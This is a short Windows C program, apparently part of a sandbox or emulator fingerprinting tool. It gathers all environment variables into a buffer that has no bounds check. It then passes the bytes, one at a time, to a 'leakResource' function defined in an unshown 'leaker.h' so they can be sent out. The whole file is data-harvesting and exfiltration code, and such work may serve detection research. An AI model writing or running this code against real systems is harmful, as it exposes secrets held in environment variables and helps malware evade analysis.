#include <windows.h>

void leakResource(int num);
void* readConfig(void);
void * memcpymyas(void* dst, const void* src, unsigned int cnt);
size_t mystrlen(const char * str);

int WINAPI WinMain(HINSTANCE a,HINSTANCE b,LPSTR c,int d){
    int* data = (int*)readConfig(); // first int is the start index, second is the end index

    /* BEGIN FINGERPRINTING */ 
    char* buf = (char*)VirtualAlloc(0, 4000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    void* strings = GetEnvironmentStrings();
    int index = 0;
    LPTSTR variable;
    for(variable = (LPTSTR)strings; *variable; variable++){
        int length = mystrlen(variable);
        memcpymyas(buf+index, variable, length);
        memcpymyas(buf+index+length, "\n", 1);
        variable += length;
        index += length+1;
    }

    for(int i = data[0]; i < data[1]; i++){
        if(buf[i] == '\0'){
            return 0;
        }
        leakResource(buf[i]);
    }

    /* END FINGERPRINTING */

    ExitProcess(0);
    return 0;
}

// I can't seem to get mingw32-gcc to change the entrypoint of the binary (when compiling
// without the standard library. Hence, the entry point defaults to the first function
// so we must include at the bottom.
#include "leaker.h"